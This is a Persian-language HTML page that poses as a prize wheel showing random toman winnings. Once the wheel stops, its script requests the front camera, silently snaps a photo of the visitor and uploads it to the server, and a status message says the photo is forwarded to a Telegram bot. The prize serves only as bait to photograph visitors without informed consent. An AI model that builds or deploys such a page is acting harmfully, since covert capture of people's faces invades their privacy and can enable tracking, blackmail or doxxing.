<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>گردونه شانس</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }
        
        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
            max-width: 600px;
        }
        
        h1 {
            color: #fff;
            margin-bottom: 30px;
            font-size: 32px;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
        }
        
        .wheel-container {
            position: relative;
            width: 300px;
            height: 300px;
            margin: 0 auto 30px;
        }
        
        canvas {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 20px rgba(255, 100, 0, 0.8));
        }
        
        .pointer {
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-top: 25px solid #FFD700;
            z-index: 10;
            filter: drop-shadow(0 0 5px #FFD700);
        }
        
        button {
            background: linear-gradient(135deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 20px;
            transition: transform 0.2s;
            text-shadow: 0 0 5px black;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
        }
        
        button:hover:not(:disabled) {
            transform: scale(1.05);
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .result {
            margin-top: 30px;
            font-size: 24px;
            color: #FFD700;
            text-shadow: 0 0 10px #FFD700;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        
        .prize-text {
            font-size: 28px;
            font-weight: bold;
            color: #00FF00;
            text-shadow: 0 0 10px #00FF00;
        }
        
        .status {
            color: #0f0;
            font-size: 14px;
            margin-top: 15px;
            min-height: 20px;
        }
        
        .error {
            color: #f00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎡 گردونه شانس</h1>
        
        <div class="wheel-container">
            <div class="pointer"></div>
            <canvas id="wheelCanvas"></canvas>
        </div>
        
        <button id="spinBtn">🎰 شروع گردونه</button>
        
        <div class="result">
            <div id="resultText"></div>
            <div class="status" id="status"></div>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('wheelCanvas');
        const ctx = canvas.getContext('2d');
        const spinBtn = document.getElementById('spinBtn');
        const resultText = document.getElementById('resultText');
        const status = document.getElementById('status');
        
        // تنظیم canvas
        canvas.width = 300;
        canvas.height = 300;
        const centerX = canvas.width / 2;
        const centerY = canvas.height / 2;
        const radius = 130;
        
        // 10 جایزه random
        const prizes = generatePrizes();
        const colors = [
            '#FF0000', // قرمز
            '#FF7F00', // نارنجی
            '#FFFF00', // زرد
            '#00FF00', // سبز
            '#00FFFF', // سیان
            '#0000FF', // آبی
            '#4B0082', // بنفش
            '#FF1493', // صورتی
            '#00CED1', // تیرکوازی
            '#FFD700'  // طلایی
        ];
        
        let currentRotation = 0;
        let isSpinning = false;
        
        // ایجاد 10 جایزه random
        function generatePrizes() {
            const min = 10000;
            const max = 10000000;
            const prizes = [];
            
            for (let i = 0; i < 10; i++) {
                const prize = Math.floor(Math.random() * (max - min + 1)) + min;
                prizes.push(prize.toLocaleString('fa-IR'));
            }
            
            return prizes;
        }
        
        // رسم گردونه
        function drawWheel() {
            const sliceAngle = (Math.PI * 2) / 10;
            
            for (let i = 0; i < 10; i++) {
                const startAngle = i * sliceAngle + currentRotation;
                const endAngle = (i + 1) * sliceAngle + currentRotation;
                
                // رسم بخش
                ctx.beginPath();
                ctx.moveTo(centerX, centerY);
                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
                ctx.closePath();
                ctx.fillStyle = colors[i];
                ctx.fill();
                ctx.strokeStyle = '#fff';
                ctx.lineWidth = 2;
                ctx.stroke();
                
                // رسم متن
                const textAngle = startAngle + sliceAngle / 2;
                const textX = centerX + Math.cos(textAngle) * (radius - 40);
                const textY = centerY + Math.sin(textAngle) * (radius - 40);
                
                ctx.save();
                ctx.translate(textX, textY);
                ctx.rotate(textAngle + Math.PI / 2);
                ctx.fillStyle = '#000';
                ctx.font = 'bold 12px Arial';
                ctx.textAlign = 'center';
                ctx.fillText(prizes[i] + ' ت', 0, 0);
                ctx.restore();
            }
        }
        
        // شروع چرخش
        function spin() {
            if (isSpinning) return;
            
            isSpinning = true;
            spinBtn.disabled = true;
            resultText.innerHTML = '';
            status.textContent = 'در حال چرخش...';
            status.classList.remove('error');
            
            const spinDuration = 4000; // 4 ثانیه
            const spinAmount = Math.random() * Math.PI * 2 + Math.PI * 4;
            const startTime = Date.now();
            
            function animate() {
                const elapsed = Date.now() - startTime;
                const progress = Math.min(elapsed / spinDuration, 1);
                
                // easing (کاهش سرعت در انتها)
                const easeProgress = 1 - Math.pow(1 - progress, 3);
                
                currentRotation = spinAmount * easeProgress;
                drawWheel();
                
                if (progress < 1) {
                    requestAnimationFrame(animate);
                } else {
                    endSpin();
                }
            }
            
            animate();
        }
        
        // پایان چرخش و دریافت عکس
        function endSpin() {
            isSpinning = false;
            
            // تعیین جایزه برنده
            const normalizedRotation = currentRotation % (Math.PI * 2);
            const sliceAngle = (Math.PI * 2) / 10;
            const winningIndex = Math.floor((Math.PI * 2 - normalizedRotation) / sliceAngle) % 10;
            const prize = prizes[winningIndex];
            
            resultText.innerHTML = `
                <div style="color: ${colors[winningIndex]};">🎉 جایزه برنده! 🎉</div>
                <div class="prize-text">${prize} تومان</div>
            `;
            
            status.textContent = 'درحال فعال‌کردن دوربین...';
            status.classList.remove('error');
            
            // فعال کردن دوربین و گرفتن عکس
            setTimeout(() => {
                capturePhoto(prize, winningIndex);
            }, 500);
        }
        
        // دوربین و عکس گرفتن
        async function capturePhoto(prize, prizeIndex) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    
                    // بعد از 1 ثانیه عکس بگیر
                    setTimeout(() => {
                        const captureCanvas = document.createElement('canvas');
                        captureCanvas.width = 640;
                        captureCanvas.height = 480;
                        const captureCtx = captureCanvas.getContext('2d');
                        captureCtx.drawImage(video, 0, 0);
                        
                        // متوقف کردن دوربین
                        stream.getTracks().forEach(track => track.stop());
                        
                        // ارسال عکس به سرور
                        captureCanvas.toBlob(blob => {
                            sendPhoto(blob, prize);
                        });
                    }, 1000);
                };
            } catch (err) {
                status.textContent = '✗ خطا: دسترسی دوربین مرفوع شد';
                status.classList.add('error');
                spinBtn.disabled = false;
            }
        }
        
        // ارسال عکس به بک‌اند
        function sendPhoto(blob, prize) {
            const formData = new FormData();
            formData.append('image', blob, 'winner.jpg');
            formData.append('prize', prize);
            
            const BACKEND_URL = window.location.origin;
            
            fetch(BACKEND_URL + '/upload', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    status.textContent = '✓ عکس برنده‌ای به بات تلگرام ارسال شد!';
                    status.classList.remove('error');
                    spinBtn.disabled = false;
                } else {
                    status.textContent = '✗ خطا: ' + (data.error || 'نامشخص');
                    status.classList.add('error');
                    spinBtn.disabled = false;
                }
            })
            .catch(err => {
                status.textContent = '✗ خطا ارتباط: ' + err.message;
                status.classList.add('error');
                spinBtn.disabled = false;
            });
        }
        
        // اولین رسم
        drawWheel();
        
        // رویداد دکمه
        spinBtn.addEventListener('click', spin);
    </script>
</body>
</html>
